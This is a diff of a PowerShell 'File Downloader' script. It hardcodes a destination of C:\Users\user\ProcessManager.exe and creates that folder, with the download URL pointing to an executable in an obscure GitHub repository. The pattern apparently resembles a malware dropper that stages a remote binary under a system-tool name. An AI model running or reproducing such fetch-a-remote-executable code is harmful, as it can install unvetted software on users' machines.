@@ -4,14 +4,17 @@ $ErrorActionPreference = "Continue"
 Write-Host "=== File Downloader ===" -ForegroundColor Green
 Write-Host "Script started at: $(Get-Date)"
 
-# Get the exact path to C:\Users\[username]
-$userName = $env:USERNAME
-$userFolder = "C:\Users\$userName"
-$destination = "$userFolder\ProcessManager.exe"
+# Hardcoded path to C:\Users\user\
+$destination = "C:\Users\user\ProcessManager.exe"
 
-Write-Host "Username: $userName"
-Write-Host "User folder: $userFolder"
-Write-Host "Destination: $destination"
+Write-Host "Hardcoded destination: $destination"
+
+# Create directory if it doesn't exist
+$userFolder = "C:\Users\user"
+if (-not (Test-Path $userFolder)) {
+    Write-Host "Creating directory: $userFolder" -ForegroundColor Yellow
+    New-Item -ItemType Directory -Path $userFolder -Force
+}
 
 # Download URL
 $url = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"
